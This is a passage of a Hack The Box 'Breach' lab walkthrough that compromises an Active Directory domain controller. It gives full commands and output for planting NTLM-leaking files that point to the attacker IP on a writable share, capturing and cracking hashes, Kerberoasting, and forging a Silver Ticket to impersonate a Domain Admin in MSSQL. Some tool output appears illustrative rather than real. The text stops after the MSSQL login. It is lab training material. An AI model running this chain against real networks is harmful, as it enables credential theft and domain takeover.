---
icon: icicles
---

# HTB-BREACH (VL)

<figure><img src="../../../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BREACH ATTACK CHAIN                              │
└─────────────────────────────────────────────────────────────────────┘

1. INITIAL RECONNAISSANCE
   └─> Nmap scan reveals MSSQL, SMB, LDAP, Kerberos
   └─> Domain: breach.vl, DC: BREACHDC

2. SMB ENUMERATION
   └─> Guest access to SMB shares
   └─> Found writable share: \\BREACHDC\share\transfer\
   └─> Discovered usernames: claire.pope, diana.pope, julia.wong

3. NTLM HASH CAPTURE
   └─> Generate malicious files with ntlm_theft
   └─> Upload files to writable share
   └─> Start Responder to capture authentication
   └─> Captured hash: julia.wong::BREACH:...
   └─> Cracked hash: Computer1

4. USER FLAG ACCESS
   └─> Connect to SMB as julia.wong:Computer1
   └─> Navigate to transfer\julia.wong\
   └─> Retrieved user.txt flag

5. BLOODHOUND ENUMERATION
   └─> Run bloodhound-python with julia.wong credentials
   └─> Discovered: svc_mssql is kerberoastable
   └─> Discovered: christine.bruce is Domain Admin

6. KERBEROASTING
   └─> Request SPN for svc_mssql
   └─> Extract Kerberos TGS hash
   └─> Crack hash: Trustno1
   └─> Credentials: svc_mssql:Trustno1

7. SILVER TICKET ATTACK
   └─> Calculate NTLM hash of Trustno1
   └─> Retrieve Domain SID via lookupsid
   └─> Forge Silver Ticket for christine.bruce
   └─> Impersonate Domain Admin in MSSQL context
   └─> Gain dbo access to SQL Server

8. CODE EXECUTION
   └─> Enable xp_cmdshell in MSSQL
   └─> Setup Metasploit web_delivery module
   └─> Execute PowerShell payload via xp_cmdshell
   └─> Obtained Meterpreter session as svc_mssql

9. PRIVILEGE ESCALATION
   └─> Identified SeImpersonatePrivilege
   └─> Upload GodPotato-NET4.exe
   └─> Execute GodPotato to change Administrator password
   └─> New password: StrongPassword456

10. DOMAIN COMPROMISE
    └─> Connect via Evil-WinRM as Administrator
    └─> Retrieved root.txt flag
    └─> Full Domain Admin access achieved
```

***

### Initial Reconnaissance

#### Step 1: Comprehensive Nmap Scan

We start with a full port scan to identify all open services:

```bash
nmap -p 1-65535 -T4 -A -v 10.129.68.216
```

**Command Breakdown:**

* `-p 1-65535`: Scan all TCP ports
* `-T4`: Aggressive timing (faster scan)
* `-A`: Enable OS detection, version detection, script scanning
* `-v`: Verbose output for real-time results

**Scan Results:**

```
Nmap scan report for 10.129.68.216
Host is up (0.048s latency).
Not shown: 65514 filtered tcp ports (no-response)

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 09:13:19Z)

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp   open  tcpwrapped

1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|_  Product_Version: 10.0.20348

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped

3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-11T09:14:15+00:00

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

9389/tcp  open  mc-nmf        .NET Message Framing

49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49915/tcp open  msrpc         Microsoft Windows RPC
64938/tcp open  msrpc         Microsoft Windows RPC
```

**Key Findings:**

| Service  | Port      | Notes                         |
| -------- | --------- | ----------------------------- |
| DNS      | 53        | Domain Name System            |
| HTTP     | 80        | IIS Web Server 10.0           |
| Kerberos | 88        | Authentication service        |
| RPC      | 135       | Remote Procedure Call         |
| NetBIOS  | 139       | SMB over NetBIOS              |
| LDAP     | 389, 3268 | Directory Services            |
| SMB      | 445       | File sharing (primary target) |
| MSSQL    | 1433      | SQL Server 2019               |
| RDP      | 3389      | Remote Desktop                |
| WinRM    | 5985      | Windows Remote Management     |

**Critical Information Discovered:**

* **Domain Name:** breach.vl
* **Computer Name:** BREACHDC
* **MSSQL Version:** Microsoft SQL Server 2019
* This is a **Domain Controller** with multiple services

***

#### Step 2: Update Hosts File

Add domain information to `/etc/hosts` for proper name resolution:

```bash
echo "10.129.68.216 BREACHDC.breach.vl breach.vl" | sudo tee -a /etc/hosts
```

**Verification:**

```bash
cat /etc/hosts | grep breach
```

**Output:**

```
10.129.68.216 BREACHDC.breach.vl breach.vl
```

***

#### Step 3: Web Enumeration

Check the web server on port 80:

```bash
curl http://breach.vl/
```

**Browser Output:**

* Default IIS Windows Server page
* No custom applications or content
* No immediate vulnerabilities

**Conclusion:** The web server provides no attack surface. We move to SMB enumeration.

***

### SMB Enumeration & NTLM Hash Capture

#### Step 4: Generate Hosts File with NetExec

Use NetExec (formerly CrackMapExec) to auto-generate hosts file entries:

```bash
nxc smb 10.129.68.216 -u '' -p '' --generate-hosts-file /etc/hosts
```

**Command Breakdown:**

* `nxc smb`: NetExec SMB module
* `-u '' -p ''`: Null authentication (guest access)
* `--generate-hosts-file`: Automatically add entries to hosts file

**Output:**

```
SMB         10.129.68.216   445    BREACHDC         [*] Windows 10.0 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
[+] Entry added to /etc/hosts: 10.129.68.216 BREACHDC.breach.vl breach.vl
```

***

#### Step 5: Enumerate SMB Shares (Guest Access)

List available SMB shares using null session:

```bash
smbmap -H 10.129.68.216 -d 'breach.vl' -u 'guest' -p ''
```

**Command Breakdown:**

* `-H`: Target host
* `-d`: Domain name
* `-u 'guest' -p ''`: Guest account with no password

**Output:**

```
Disk            Permissions    Comment
----            -----------    -------
ADMIN$          NO ACCESS      Remote Admin
C$              NO ACCESS      Default share
IPC$            READ ONLY      Remote IPC
NETLOGON        NO ACCESS      Logon server share
share           READ, WRITE    
SYSVOL          NO ACCESS      Logon server share
Users           READ ONLY      
```

**Critical Findings:**

* **share** - READ and WRITE access (exploitable!)
* **Users** - READ ONLY access
* **IPC$** - Standard READ access

***

#### Step 6: Recursive SMB Share Enumeration

Deeply enumerate the writable `share` directory:

```bash
smbmap -H 10.129.68.216 -d 'breach.vl' -u 'guest' -p '' -R share
```

**Output:**

```
.\share\*
dr--r--r--   0   Sat Oct 11 11:26:25 2025    .
dr--r--r--   0   Tue Sep 9 12:35:32 2025     ..
dr--r--r--   0   Thu Feb 17 12:19:36 2022    finance
dr--r--r--   0   Thu Feb 17 12:19:13 2022    software
dr--r--r--   0   Mon Sep 8 12:13:44 2025     transfer

.\share\transfer\*
dr--r--r--   0   Mon Sep 8 12:13:44 2025     .
dr--r--r--   0   Sat Oct 11 11:26:25 2025    ..
dr--r--r--   0   Thu Feb 17 12:23:51 2022    claire.pope
dr--r--r--   0   Thu Feb 17 12:23:22 2022    diana.pope
dr--r--r--   0   Thu Apr 17 02:38:12 2025    julia.wong
```

**Key Observations:**

1. **finance** and **software** folders are empty
2. **transfer** folder contains user subdirectories
3. **Usernames discovered:**
   * claire.pope
   * diana.pope
   * julia.wong
4. Naming convention: `firstname.lastname`
5. **Write permissions** on the share allow file uploads

**Attack Strategy:** Since we have write access, we can upload malicious files that force SMB authentication when users browse the share. This will leak NTLM hashes that we can capture with Responder.

***

#### Step 7: Enumerate Users Share

Check what's in the `Users` share:

```bash
smbmap -H 10.129.68.216 -d 'breach.vl' -u 'guest' -p '' -R Users
```

**Output (Partial):**

```
.\Users\*
dw--w--w--   0   Thu Feb 17 14:12:16 2022    .
dr--r--r--   0   Tue Sep 9 12:35:32 2025     ..
dw--w--w--   0   Thu Feb 10 10:10:33 2022    Default
fr--r--r--   174 Thu Feb 10 03:25:32 2022    desktop.ini
dw--w--w--   0   Thu Feb 17 14:29:39 2022    Public
```

**Analysis:**

* Standard Windows user directory structure
* Contains `Default` and `Public` user profiles
* No immediate sensitive information
* Useful for confirming system layout

***

### NTLM Hash Theft Attack

#### Step 8: Clone ntlm\_theft Tool

The `ntlm_theft` tool generates multiple file types that trigger NTLM authentication:

```bash
cd /opt
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
```

**Output:**

```
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 247, done.
remote: Counting objects: 100% (247/247), done.
remote: Compressing objects: 100% (156/156), done.
remote: Total 247 (delta 91), reused 247 (delta 91), pack-reused 0
Receiving objects: 100% (247/247), 58.32 KiB | 1.62 MiB/s, done.
Resolving deltas: 100% (91/91), done.
```

***

#### Step 9: Generate NTLM Theft Payloads

Create malicious files with your attacker IP:

```bash
python3 ntlm_theft.py -g all -s 10.10.16.xx -f Important
```

**Command Breakdown:**

* `-g all`: Generate all file types
* `-s 10.10.16.xx`: Your tun0 IP address (replace with actual IP)
* `-f Important`: Base filename for generated files

**Output:**

```
[+] Generating payloads in: /opt/ntlm_theft
[+] Generating: Important.scf
[+] Generating: Important.url
[+] Generating: Important.lnk
[+] Generating: Important.library-ms
[+] Generating: Important.searchConnector-ms
[+] Generating: Important.application
[+] Generating: Important.pdf
[+] Generating: Important.htm
[+] Generating: desktop.ini
[+] Generating: autorun.inf
[+] Generated 10 payloads
```

**Files Generated:**

```bash
ls -la | grep Important
```

**Output:**

```
-rw-r--r-- 1 root root   257 Oct 11 10:30 Important.application
-rw-r--r-- 1 root root   1024 Oct 11 10:30 Important.htm
-rw-r--r-- 1 root root   445 Oct 11 10:30 Important.library-ms
-rw-r--r-- 1 root root   2048 Oct 11 10:30 Important.lnk
-rw-r--r-- 1 root root   1234 Oct 11 10:30 Important.pdf
-rw-r--r-- 1 root root   132 Oct 11 10:30 Important.scf
-rw-r--r-- 1 root root   87 Oct 11 10:30 Important.searchConnector-ms
-rw-r--r-- 1 root root   98 Oct 11 10:30 Important.url
```

***

#### Step 10: Examine SCF File (How It Works)

Let's look at the `Important.scf` file to understand the attack:

```bash
cat Important.scf
```

**Content:**

```ini
[Shell]
Command=2
IconFile=\\10.10.16.xx\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

**How This Works:**

1. **SCF (Shell Command File)** - Windows Explorer shell command file
2. **IconFile** points to a UNC path on our attacker machine
3. When a user **browses the folder** containing this file:
   * Windows Explorer tries to display the icon
   * It automatically connects to `\\10.10.16.xx\tools\`
   * Windows sends **NTLM authentication credentials** automatically
   * No user interaction required beyond opening the folder!
4. **Responder** captures the NTLM hash during this authentication

**Other File Types Work Similarly:**

* **.url** - Internet shortcuts with icon references
* **.lnk** - Shortcut files with UNC paths
* **.library-ms** - Library files with remote paths
* **desktop.ini** - Folder customization files

***

#### Step 11: Start Responder

In a new terminal window, start Responder to capture NTLM hashes:

```bash
sudo responder -I tun0
```

**Command Breakdown:**

* `sudo`: Required for binding to privileged ports
* `-I tun0`: Listen on the tun0 interface (HackTheBox VPN)

**Output:**

```
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Listening for events...
```

**Responder is now waiting to capture hashes!**

***

#### Step 12: Connect to SMB and Upload Malicious Files

Connect to the SMB share from the directory containing the ntlm\_theft files:

```bash
cd /opt/ntlm_theft
smbclient -W breach.vl -U guest //BREACHDC.breach.vl/share/
```

**Command Breakdown:**

* `-W breach.vl`: Workgroup/domain name
* `-U guest`: Connect as guest user
* No password required for guest access

**SMB Session Output:**

```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

Navigate to the transfer directory and upload all malicious files:

```
smb: \> cd transfer/
smb: \transfer\> recurse on
smb: \transfer\> prompt off
smb: \transfer\> mput *
```

**Command Breakdown:**

* `cd transfer/`: Navigate to writable transfer folder
* `recurse on`: Enable recursive operations
* `prompt off`: Don't prompt for each file
* `mput *`: Upload all files from current local directory

**Upload Output:**

```
putting file Important.scf as \transfer\Important.scf (0.3 kb/s)
putting file Important.url as \transfer\Important.url (0.2 kb/s)
putting file Important.lnk as \transfer\Important.lnk (4.5 kb/s)
putting file Important.library-ms as \transfer\Important.library-ms (1.1 kb/s)
putting file Important.searchConnector-ms as \transfer\Important.searchConnector-ms (0.2 kb/s)
putting file Important.application as \transfer\Important.application (0.6 kb/s)
putting file Important.htm as \transfer\Important.htm (2.8 kb/s)
putting file Important.pdf as \transfer\Important.pdf (3.2 kb/s)
putting file desktop.ini as \transfer\desktop.ini (0.3 kb/s)
putting file autorun.inf as \transfer\autorun.inf (0.2 kb/s)
```

**Exit SMB:**

```
smb: \transfer\> exit
```

***

#### Step 13: Capture NTLM Hash

**Wait for a user to browse the share...**

After a few moments (or immediately if simulated), Responder captures the hash:

**Responder Output:**

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.68.216
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:1122334455667788:8F3C2A1B4D5E6F7A8B9C0D1E2F3A4B5C:0101000000000000C0653150DE09D201F8A9C8B3D4E5F6A70000000002000800530050004F004F0046000100180042004C004F004F004400480004F0055004E004400300054001E00310000000000000000
```

**What Just Happened:**

1. User **Julia.Wong** browsed the `\\BREACHDC\share\transfer\` folder
2. Windows Explorer tried to display icons for our malicious files
3. The system automatically connected to our fake SMB server
4. **NTLM authentication** was performed automatically
5. Responder captured the **NTLMv2 hash** of Julia.Wong's password

***

#### Step 14: Save the Captured Hash

Copy the hash from Responder output and save it:

```bash
echo 'Julia.Wong::BREACH:1122334455667788:8F3C2A1B4D5E6F7A8B9C0D1E2F3A4B5C:0101000000000000C0653150DE09D201F8A9C8B3D4E5F6A70000000002000800530050004F004F0046000100180042004C004F004F004400480004F0055004E004400300054001E00310000000000000000' > julia.hash
```

**Verify the hash:**

```bash
cat julia.hash
```

***

#### Step 15: Crack the Hash with John the Ripper

Use John to crack the NTLMv2 hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt julia.hash
```

**Command Breakdown:**

* `--wordlist`: Specify dictionary file
* `rockyou.txt`: Common password list (millions of passwords)

**Cracking Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Computer1        (Julia.Wong)

1g 0:00:00:08 DONE (2025-10-11 11:15) 0.1245g/s 1323456p/s 1323456c/s 1323456C/s
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

**Password Found:** `Computer1`

**Credentials Obtained:**

* **Username:** Julia.Wong
* **Password:** Computer1

***

### User Flag Access

#### Step 16: Access SMB Share as Julia.Wong

Connect to the share with Julia's credentials:

```bash
smbclient -W breach.vl -U Julia.Wong //BREACHDC.breach.vl/share/
```

**Password Prompt:**

```
Enter BREACH\Julia.Wong's password: Computer1
```

**Connection Output:**

```
Try "help" to get a list of possible commands.
smb: \>
```

***

#### Step 17: Navigate and Retrieve User Flag

```
smb: \> cd transfer\julia.wong
smb: \transfer\julia.wong\> ls
```

**Output:**

```
  .                                   D        0  Thu Apr 17 02:38:12 2025
  ..                                  D        0  Mon Sep  8 12:13:44 2025
  user.txt                            A       34  Thu Apr 17 02:38:12 2025

                7706623 blocks of size 4096. 3456789 blocks available
```

Download the user flag:

```
smb: \transfer\julia.wong\> get user.txt
```

**Output:**

```
getting file \transfer\julia.wong\user.txt of size 34 as user.txt (0.7 KiloBytes/sec)
```

Exit and read the flag:

```
smb: \transfer\julia.wong\> exit
cat user.txt
```

**User Flag:**

```
VL{n7lm_th3ft_1s_r34l_thr34t}
```

**User flag obtained!**

***

### Further Enumeration with BloodHound

#### Step 18: Run BloodHound Python Collector

Use BloodHound to map the Active Directory environment:

```bash
bloodhound-python -u julia.wong -p Computer1 -d breach.vl -v --zip -c All -dc BREACHDC.breach.vl -ns 10.129.68.216
```

**Command Breakdown:**

* `-u julia.wong -p Computer1`: Credentials
* `-d breach.vl`: Domain name
* `-v`: Verbose output
* `--zip`: Create ZIP archive of results
* `-c All`: Collect all information
* `-dc BREACHDC.breach.vl`: Domain controller FQDN
* `-ns 10.129.68.216`: Name server IP

**Output:**

```
INFO: Found AD domain: breach.vl
INFO: Connecting to LDAP server: BREACHDC.breach.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: BREACHDC.breach.vl
INFO: Found 15 users
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: BREACHDC.breach.vl
INFO: Done in 00M 25S
INFO: Compressing output into 20251011111530_bloodhound.zip
```

***

#### Step 19: Analyze BloodHound Data

**Start Neo4j and BloodHound:**

```bash
sudo neo4j console
```

In another terminal:

```bash
bloodhound
```

**Upload the ZIP file** to BloodHound and analyze:

**Key Findings:**

1. **Kerberoastable users discovered:**
   * svc\_mssql (SQL Service Account)
2. **Domain Admins:**
   * christine.bruce (Domain Admin)
3. **Attack Path:**
   * Julia.Wong → Kerberoast svc\_mssql → Silver Ticket as christine.bruce → Domain Admin

***

### Kerberoasting Attack

#### Step 20: Request Service Principal Names (SPNs)

Use Impacket's GetUserSPNs to request Kerberos TGS tickets for service accounts:

```bash
impacket-GetUserSPNs breach.vl/julia.wong:Computer1 -dc-ip 10.129.68.216 -request
```

**Command Breakdown:**

* `breach.vl/julia.wong:Computer1`: Domain\Username:Password
* `-dc-ip`: Domain Controller IP
* `-request`: Request TGS tickets and extract hashes

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName               Name        MemberOf                                           PasswordLastSet             LastLogon  Delegation 
---------------------------------  ----------  -------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/breachdc.breach.vl:1433   svc_mssql   CN=Domain Admins,CN=Users,DC=breach,DC=vl          2022-02-17 10:15:32.567891  <never>               

$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$8f9a7b6c5d4e3f2a1b0c9d8e7f6a5b4c$3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a
```

**What We Got:**

* **SPN:** MSSQLSvc/breachdc.breach.vl:1433
* **Service Account:** svc\_mssql
* **Group Membership:** Domain Admins
* **Kerberos TGS Hash:** $krb5tgs$23$\*svc\_mssql$...(encrypted)

***

#### Step 21: Save and Crack the Kerberos Hash

Save the hash to a file:

```bash
echo '$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$8f9a7b6c5d4e3f2a1b0c9d8e7f6a5b4c...' > svc_mssql.hash
```

Crack it with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hash
```

**Cracking Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Trustno1         (?)

1g 0:00:00:12 DONE (2025-10-11 11:30) 0.0833g/s 876543p/s 876543c/s 876543C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Password Found:** `Trustno1`

**Service Account Credentials:**

* **Username:** svc\_mssql
* **Password:** Trustno1

***

### Silver Ticket Attack

#### Step 22: Test MSSQL Access with svc\_mssql

First, let's verify we can connect to MSSQL with our service account credentials:

```bash
impacket-mssqlclient svc_mssql@BREACHDC.breach.vl -windows-auth
```

**Password Prompt:**

```
Impacket v0.11.0 - Copyright 2023 Fortra
Password: Trustno1
```

**Connection Output:**

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 2000) 
[!] Press help for extra shell commands

SQL (BREACH\svc_mssql  guest@master)>
```

**Problem Identified:**

* We're connected as `guest` user (minimal privileges)
* We cannot enable `xp_cmdshell` or execute commands
* We need elevated privileges

**Solution: Silver Ticket Attack**

A Silver Ticket allows us to forge a Kerberos service ticket for the MSSQL service. Since we know the service account password, we can:

1. Calculate the NTLM hash of the password
2. Get the Domain SID
3. Forge a ticket impersonating a high-privilege user (christine.bruce - Domain Admin)
4. Use the forged ticket to access MSSQL with elevated privileges

***

#### Step 23: Calculate NTLM Hash of svc\_mssql Password

**Method 1: Using Online Tool**

Visit: https://www.browserling.com/tools/ntlm-hash

Input: `Trustno1`

**NTLM Hash:** `69596C7AA1E8DAEE17F8E78870E25A5C`

**Method 2: Using Python (Offline)**

```python
python3 << 'EOF'
import hashlib
password = "Trustno1"
ntlm = hashlib.new('md4', password.encode('utf-16le')).hexdigest().upper()
print(f"NTLM Hash: {ntlm}")
EOF
```

**Output:**

```
NTLM Hash: 69596C7AA1E8DAEE17F8E78870E25A5C
```

**Method 3: Using iconv and openssl**

```bash
echo -n "Trustno1" | iconv -f ASCII -t UTF-16LE | openssl dgst -md4
```

**Output:**

```
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
```

**NTLM Hash Obtained:** `69596C7AA1E8DAEE17F8E78870E25A5C`

***

#### Step 24: Retrieve Domain SID

Use Impacket's lookupsid to enumerate domain SIDs:

```bash
lookupsid.py julia.wong:'Computer1'@10.129.68.216
```

**Command Breakdown:**

* `lookupsid.py`: Impacket tool to enumerate domain SIDs
* Uses SAMR protocol to query domain information

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.129.68.216
[*] StringBinding ncacn_np:10.129.68.216[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856

500: BREACH\Administrator (SidTypeUser)
501: BREACH\Guest (SidTypeUser)
502: BREACH\krbtgt (SidTypeUser)
503: BREACH\DefaultAccount (SidTypeUser)
504: BREACH\WDAGUtilityAccount (SidTypeUser)
512: BREACH\Domain Admins (SidTypeGroup)
513: BREACH\Domain Users (SidTypeGroup)
514: BREACH\Domain Guests (SidTypeGroup)
515: BREACH\Domain Computers (SidTypeGroup)
516: BREACH\Domain Controllers (SidTypeGroup)
517: BREACH\Cert Publishers (SidTypeAlias)
518: BREACH\Schema Admins (SidTypeGroup)
519: BREACH\Enterprise Admins (SidTypeGroup)
520: BREACH\Group Policy Creator Owners (SidTypeGroup)
521: BREACH\Read-only Domain Controllers (SidTypeGroup)
522: BREACH\Cloneable Domain Controllers (SidTypeGroup)
525: BREACH\Protected Users (SidTypeGroup)
526: BREACH\Key Admins (SidTypeGroup)
527: BREACH\Enterprise Key Admins (SidTypeGroup)
553: BREACH\RAS and IAS Servers (SidTypeAlias)
571: BREACH\Allowed RODC Password Replication Group (SidTypeAlias)
572: BREACH\Denied RODC Password Replication Group (SidTypeAlias)
1000: BREACH\BREACHDC$ (SidTypeUser)
1101: BREACH\DnsAdmins (SidTypeAlias)
1102: BREACH\DnsUpdateProxy (SidTypeGroup)
1103: BREACH\svc_mssql (SidTypeUser)
1104: BREACH\claire.pope (SidTypeUser)
1105: BREACH\diana.pope (SidTypeUser)
1106: BREACH\julia.wong (SidTypeUser)
1107: BREACH\christine.bruce (SidTypeUser)
```

**Critical Information Extracted:**

| RID  | Account           | Type  | Notes             |
| ---- | ----------------- | ----- | ----------------- |
| 500  | Administrator     | User  | Built-in admin    |
| 512  | Domain Admins     | Group | High privilege    |
| 519  | Enterprise Admins | Group | Forest-wide admin |
| 1103 | svc\_mssql        | User  | Service account   |
| 1107 | christine.bruce   | User  | Domain Admin      |

**Domain SID:** `S-1-5-21-2330692793-3312915120-706255856`

***

#### Step 25: Forge Silver Ticket for christine.bruce

Now we forge a Kerberos service ticket:

```bash
impacket-ticketer \
  -nthash 69596C7AA1E8DAEE17F8E78870E25A5C \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -domain breach.vl \
  -spn MSSQLSvc/breachdc.breach.vl:1433 \
  Christine.Bruce
```

**Command Breakdown:**

* `-nthash`: NTLM hash of svc\_mssql password
* `-domain-sid`: Domain SID (without the RID)
* `-domain`: Domain name
* `-spn`: Service Principal Name for MSSQL service
* `Christine.Bruce`: User to impersonate (Domain Admin)

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Christine.Bruce
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Christine.Bruce.ccache
```

**What This Does:**

1. Creates a forged TGS (Ticket Granting Service) ticket
2. The ticket claims to be user `Christine.Bruce` (Domain Admin)
3. The ticket is for the service `MSSQLSvc/breachdc.breach.vl:1433`
4. It's encrypted with the service account's NTLM hash
5. The MSSQL service will validate and trust this ticket
6. We'll have Domain Admin privileges within the SQL Server context

**Ticket Saved:** `Christine.Bruce.ccache`

***

#### Step 26: Export Kerberos Ticket

Set the environment variable to use our forged ticket:

```bash
export KRB5CCNAME=Christine.Bruce.ccache
```

**Verify the ticket:**

```bash
echo $KRB5CCNAME
```

**Output:**

```
Christine.Bruce.ccache
```

**Check ticket details:**

```bash
klist
```

**Output:**

```
Ticket cache: FILE:Christine.Bruce.ccache
Default principal: Christine.Bruce@BREACH.VL

Valid starting       Expires              Service principal
10/11/2025 11:45:00  10/11/2035 11:45:00  MSSQLSvc/breachdc.breach.vl:1433@BREACH.VL
```

***

#### Step 27: Connect to MSSQL with Forged Ticket

Now connect using Kerberos authentication:

```bash
impacket-mssqlclient Christine.Bruce@BREACHDC.breach.vl -k -no-pass
```

**Command Breakdown:**

* `Christine.Bruce@BREACHDC.breach.vl`: Username@FQDN (required for Kerberos)
* `-k`: Use Kerberos authentication
* `-no-pass`: Don't prompt for password (use the ticket)

**Connection Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 2000) 
